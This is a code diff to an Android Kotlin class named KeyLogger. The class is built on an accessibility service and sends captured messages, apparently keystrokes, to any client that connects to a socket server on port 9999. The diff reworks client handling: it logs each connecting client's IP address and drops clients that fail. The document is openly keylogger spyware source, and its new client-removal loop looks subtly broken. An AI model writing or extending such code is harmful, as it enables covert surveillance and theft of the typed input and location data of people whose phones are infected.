@@ -22,6 +22,7 @@ import java.io.DataOutputStream
 import java.io.IOException
 import java.io.PrintWriter
 import java.net.ServerSocket
+import java.net.Socket
 import java.text.SimpleDateFormat
 import java.util.Date
 
@@ -33,7 +34,7 @@ class KeyLogger : AccessibilityService() {
     private lateinit var locationRequest: LocationRequest
 
     private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
-    private val clients = ArrayList<DataOutputStream>()
+    private val clients = ArrayList<Socket>()
     override fun onServiceConnected() {
         super.onServiceConnected()
 
@@ -99,7 +100,9 @@ class KeyLogger : AccessibilityService() {
             val serverSocket = ServerSocket(9999)
             while (true) {
                 val client = serverSocket.accept()
-                clients.add(DataOutputStream(client.getOutputStream()))
+                val inetAddress = client.remoteSocketAddress.toString()
+                Log.d("ip address", inetAddress)
+                clients.add(client)
             }
         } catch (e: Exception) {
             e.printStackTrace()
@@ -111,8 +114,11 @@ class KeyLogger : AccessibilityService() {
         try {
             for (client in clients) {
                 try{
-                    client.writeUTF(message)
+                    val dataOutputStream = DataOutputStream(client.getOutputStream())
+                    dataOutputStream.writeUTF(message)
                 }catch (e: Exception) {
+                    client.close()
+                    clients.remove(client)
                     e.printStackTrace()
                 }
             }
